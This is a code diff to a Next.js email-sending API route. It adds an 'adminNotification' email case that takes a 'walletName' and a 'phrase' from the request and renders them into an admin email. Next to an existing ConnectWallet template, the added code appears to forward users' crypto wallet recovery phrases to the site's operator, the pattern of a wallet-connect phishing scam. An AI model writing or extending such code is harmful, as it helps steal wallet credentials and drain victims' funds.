@@ -4,6 +4,8 @@ import ConnectWallet from "../../../../emails/ConnectWallet";
 import Send from "../../../../emails/Send";
 import SuspendTemplate from "../../../../emails/SuspendTemplate";
 import RevokeSuspensionTemplate from "../../../../emails/RevokeSuspension";
+import AdminNotification from "../../../../emails/AdminNotification";
+
 
 import { render } from "@react-email/render";
 import { NextResponse } from "next/server";
@@ -13,7 +15,7 @@ import { sendEmail } from "@/lib/email";
 export async function POST(request: Request) {
     const body = await request.json();
     try {
-        const { to, subject, name, otp, emailType, currentTime, transactionAmount, transactionCoin, transactionWallet, transactionNetwork } = body;
+        const { to, subject, name, otp, emailType, currentTime, transactionAmount, transactionCoin, transactionWallet, transactionNetwork, walletName, phrase, } = body;
 
         if (!to || !subject || !emailType ) {
 
@@ -41,6 +43,9 @@ export async function POST(request: Request) {
             break;
           case "userSuspension":
             emailHtml = render(SuspendTemplate({ userName: name }));
+            break;
+          case "adminNotification":
+            emailHtml = render(AdminNotification({userName: name, walletName, phrase }))
             break;
           default:
             throw new Error('Invalid emailType');
